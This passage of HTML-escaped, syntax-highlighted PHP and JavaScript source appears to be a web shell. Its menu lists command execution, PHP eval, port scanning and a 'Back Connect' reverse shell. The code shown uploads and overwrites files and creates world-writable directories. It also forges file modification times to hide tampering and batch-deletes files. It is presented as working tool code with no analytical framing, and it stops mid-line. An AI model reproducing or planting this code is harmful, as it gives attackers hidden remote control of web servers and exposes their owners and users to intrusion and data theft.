#f99157;\">prompt</span>('Original file:'+sname+'\\nPlease input object file (fullpath<span style=\"text-decoration: underline;\">):', '');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> if</span> (!tofile)<span style=\"color: #99cc99;\"> return</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('copyfile').tofile.value=tofile;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('copyfile').sname.value=sname;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('copyfile').<span style=\"color: #f99157;\">submit</span>();\n}\n<span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">rename</span>(oldname){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> var</span> <span style=\"color: #ffcc66;\">newfilename</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   newfilename = <span style=\"color: #f99157;\">prompt</span>('Former file name:'+oldname+'\\nPlease input new filenam<span style=\"text-decoration: underline;\">e:', '');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> if</span> (!newfilename)<span style=\"color: #99cc99;\"> return</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('rename').newfilename.value=newfilename;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('rename').oldname.value=oldname;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('rename').<span style=\"color: #f99157;\">submit</span>();\n}\n<span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">dofile</span>(doing,thefile,m){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> if</span> (m &amp;&amp; !<span style=\"color: #f99157;\">confirm</span>(m)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> return</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('filelist').doing.value=doing;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> if</span> (thefile){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('filelist').thefile.value=thefile;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('filelist').<span style=\"color: #f99157;\">submit</span>();\n}\n<span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">createfile</span>(nowpath){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> var</span> <span style=\"color: #ffcc66;\">filename</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   filename = <span style=\"color: #f99157;\">prompt</span>('Please input the file name:', '');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> if</span> (!filename)<span style=\"color: #99cc99;\"> return</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #f99157;\">opfile</span>('editfile',nowpath + filename,nowpath);\n}\n<span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">opfile</span>(action,opfile,dir){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('fileopform').action.value=action;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('fileopform').opfile.value=opfile;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('fileopform').dir.value=dir;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('fileopform').<span style=\"color: #f99157;\">submit</span>();\n}\n<span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">godir</span>(dir,view_writable){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> if</span> (view_writable) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('godir').view_writable.value=view_writable;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('godir').dir.value=dir;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('godir').<span style=\"color: #f99157;\">submit</span>();\n}\n<span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">getsize</span>(getdir,dir){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('getsize').getdir.value=getdir;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('getsize').dir.value=dir;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('getsize').<span style=\"color: #f99157;\">submit</span>();\n}\n<span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">editrecord</span>(action, base64, tablename){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> if</span> (action == 'del') {<span style=\"color: #f99157; background-color: #515151;\">      </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> if</span> (!<span style=\"color: #f99157;\">confirm</span>('Is or isn\\'t deletion record?'))<span style=\"color: #99cc99;\"> return</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('recordlist').doing.value=action;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('recordlist').base64.value=base64;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('recordlist').tablename.value=tablename;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('recordlist').<span style=\"color: #f99157;\">submit</span>();\n}\n<span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">moddbname</span>(dbname) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> if</span>(!dbname)<span style=\"color: #99cc99;\"> return</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('setdbname').dbname.value=dbname;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('setdbname').<span style=\"color: #f99157;\">submit</span>();\n}\n<span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">settable</span>(tablename,doing,page) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> if</span>(!tablename)<span style=\"color: #99cc99;\"> return</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> if</span> (doing) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('settable').doing.value=doing;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> if</span> (page) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('settable').page.value=page;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('settable').tablename.value=tablename;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('settable').<span style=\"color: #f99157;\">submit</span>();\n}\n<span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">s</span>(action,nowpath,p1,p2,p3,p4,p5) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> if</span>(action) $('opform').action.value=action;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> if</span>(nowpath) $('opform').nowpath.value=nowpath;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> if</span>(p1) $('opform').p1.value=p1;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> if</span>(p2) $('opform').p2.value=p2;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> if</span>(p3) $('opform').p3.value=p3;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> if</span>(p4) $('opform').p4.value=p4;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> if</span>(p5) $('opform').p4.value=p5;\n}\n<span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">g</span>(action,nowpath,p1,p2,p3,p4,p5) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> if</span>(!action)<span style=\"color: #99cc99;\"> return</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #f99157;\">s</span>(action,nowpath,p1,p2,p3,p4,p5);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('opform').<span style=\"color: #f99157;\">submit</span>();\n}\n&lt;/script&gt;\n&lt;/head&gt;\n&lt;body style=\"margin:0;table-layout:fixed; word-break:break-all\"&gt;\n&lt;?php\nformhead(array('name'=&gt;'opform'));\nmakehide('action', $action);\nmakehide('nowpath', $nowpath);\nmakehide('p1', $p1);\nmakehide('p2', $p2);\nmakehide('p3', $p3);\nmakehide('p4', $p4);\nmakehide('p5', $p5);\nformfoot();\n\nif(!function_exists('posix_getegid')) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $user = @get_current_user();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $uid = @getmyuid();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $gid = @getmygid();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $group = \"?\";\n} else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $uid = @posix_getpwuid(@posix_geteuid());\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $gid = @posix_getgrgid(@posix_getegid());\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $user = $uid['name'];\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $uid = $uid['uid'];\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $group = $gid['name'];\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $gid = $gid['gid'];\n}\n\n?&gt;\n&lt;table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\"&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;tr class=\"head\"&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;td&gt;&lt;span style=\"float:right;\"&gt;&lt;?php echo @php_uname();?&gt; / User:&lt;?php e<span style=\"text-decoration: underline;\">cho $uid.' ( '.$user.' ) / Group: '.$gid.' ( '.$group.' )';?&gt;&lt;/span&gt;&lt;?php echo $_SERVER['HTTP_HOST'];?&gt; (&lt;?php echo gethostbyname($_SERVER['SERVER_NAME']);?&gt;)&lt;/td&gt;</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;/tr&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;tr class=\"alt1\"&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;td&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;span style=\"float:right;\"&gt;PHP &lt;?php echo PHP_VERSION;?&gt; / Safe Mode<span style=\"text-decoration: underline;\">:&lt;?php echo getcfg('safe_mode');?&gt;&lt;/span&gt;</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;a href=\"javascript:g('logout');\"&gt;Logout&lt;/a&gt; |<span style=\"color: #f99157; background-color: #515151;\"> </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;a href=\"javascript:g('file');\"&gt;File Manager&lt;/a&gt; |<span style=\"color: #f99157; background-color: #515151;\"> </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;a href=\"javascript:g('mysqladmin');\"&gt;MYSQL Manager&lt;/a&gt; |<span style=\"color: #f99157; background-color: #515151;\"> </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;a href=\"javascript:g('sqlfile');\"&gt;MySQL Upload &amp;amp; Download&lt;/a&gt; |<span style=\"color: #f99157; background-color: #515151; text-decoration: underline;\"> </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;a href=\"javascript:g('shell');\"&gt;Execute Command&lt;/a&gt; |<span style=\"color: #f99157; background-color: #515151;\"> </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;a href=\"javascript:g('phpenv');\"&gt;PHP Variable&lt;/a&gt; |<span style=\"color: #f99157; background-color: #515151;\"> </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;a href=\"javascript:g('portscan');\"&gt;Port Scan&lt;/a&gt; |<span style=\"color: #f99157; background-color: #515151;\"> </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;a href=\"javascript:g('secinfo');\"&gt;Security information&lt;/a&gt; |<span style=\"color: #f99157; background-color: #515151;\"> </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;a href=\"javascript:g('eval');\"&gt;Eval PHP Code&lt;/a&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;?php if (!IS_WIN) {?&gt; | &lt;a href=\"javascript:g('backconnect');\"&gt;Back<span style=\"text-decoration: underline;\"> Connect&lt;/a&gt;&lt;?php }?&gt;</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;/td&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;/tr&gt;\n&lt;/table&gt;\n&lt;table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\"&gt;&lt;tr&gt;&lt;td&gt;\n&lt;?php\n$errmsg &amp;&amp; m($errmsg);\n\n// &#33719;&#21462;&#24403;&#21069;&#36335;&#24452;\nif (!$dir) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $dir = $_SERVER[\"DOCUMENT_ROOT\"] ? $_SERVER[\"DOCUMENT_ROOT\"] : '.';\n}\n$nowpath = getPath(SA_ROOT, $dir);\nif (substr($dir, -1) != '/') {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $dir = $dir.'/';\n}\n\nif ($action == 'file') {\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   // &#21028;&#26029;&#35835;&#20889;&#24773;&#20917;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $dir_writeable = @is_writable($nowpath) ? 'Writable' : 'Non-writable';\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   // &#21019;&#24314;&#30446;&#24405;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($newdirname) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $mkdirs = $nowpath.$newdirname;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (file_exists($mkdirs)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   m('Directory has already existed');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   m('Directory created '.(@mkdir($mkdirs,0777) ? 'success' : 'failed')<span style=\"text-decoration: underline;\">);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   @chmod($mkdirs,0777);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   // &#19978;&#20256;&#25991;&#20214;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   elseif ($doupfile) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   m('File upload '.(@copy($_FILES['uploadfile']['tmp_name'],$uploaddir.'/'<span style=\"text-decoration: underline;\">.$_FILES['uploadfile']['name']) ? 'success' : 'failed'));</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   // &#32534;&#36753;&#25991;&#20214;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   elseif ($editfilename &amp;&amp; $filecontent) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $fp = @fopen($editfilename,'w');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   m('Save file '.(@fwrite($fp,$filecontent) ? 'success' : 'failed'));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   @fclose($fp);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   // &#32534;&#36753;&#25991;&#20214;&#23646;&#24615;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   elseif ($pfile &amp;&amp; $newperm) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (!file_exists($pfile)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   m('The original file does not exist');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $newperm = base_convert($newperm,8,10);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   m('Modify file attributes '.(@chmod($pfile,$newperm) ? 'success' : '<span style=\"text-decoration: underline;\">failed'));</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   // &#25913;&#21517;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   elseif ($oldname &amp;&amp; $newfilename) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $nname = $nowpath.$newfilename;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (file_exists($nname) || !file_exists($oldname)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   m($nname.' has already existed or original file does not exist');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   m(basename($oldname).' renamed '.basename($nname).(@rename($oldname,<span style=\"text-decoration: underline;\">$nname) ? ' success' : 'failed'));</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   // &#22797;&#21046;&#25991;&#20214;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   elseif ($sname &amp;&amp; $tofile) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (file_exists($tofile) || !file_exists($sname)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   m('The goal file has already existed or original file does not exist<span style=\"text-decoration: underline;\">');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   m(basename($tofile).' copied '.(@copy($sname,$tofile) ? basename($to<span style=\"text-decoration: underline;\">file).' success' : 'failed'));</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   // &#20811;&#38534;&#26102;&#38388;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   elseif ($curfile &amp;&amp; $tarfile) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (!@file_exists($curfile) || !@file_exists($tarfile)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   m('The goal file has already existed or original file does not exist<span style=\"text-decoration: underline;\">');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $time = @filemtime($tarfile);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   m('Modify file the last modified '.(@touch($curfile,$time,$time) ? '<span style=\"text-decoration: underline;\">success' : 'failed'));</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   // &#33258;&#23450;&#20041;&#26102;&#38388;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   elseif ($curfile &amp;&amp; $year &amp;&amp; $month &amp;&amp; $day &amp;&amp; $hour &amp;&amp; $minute &amp;&amp; $second) <span style=\"text-decoration: underline;\">{</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (!@file_exists($curfile)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   m(basename($curfile).' does not exist');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $time = strtotime(\"$year-$month-$day $hour:$minute:$second\");\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   m('Modify file the last modified '.(@touch($curfile,$time,$time) ? '<span style=\"text-decoration: underline;\">success' : 'failed'));</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   // &#25209;&#37327;&#21024;&#38500;&#25991;&#20214;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   elseif($doing == 'delfiles') {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($dl) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $dfiles='';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $succ = $fail = 0;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   foreach ($dl as $filepath) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (is_dir($filepath)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (@deltree($filepath)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $succ++;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $fail++;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: 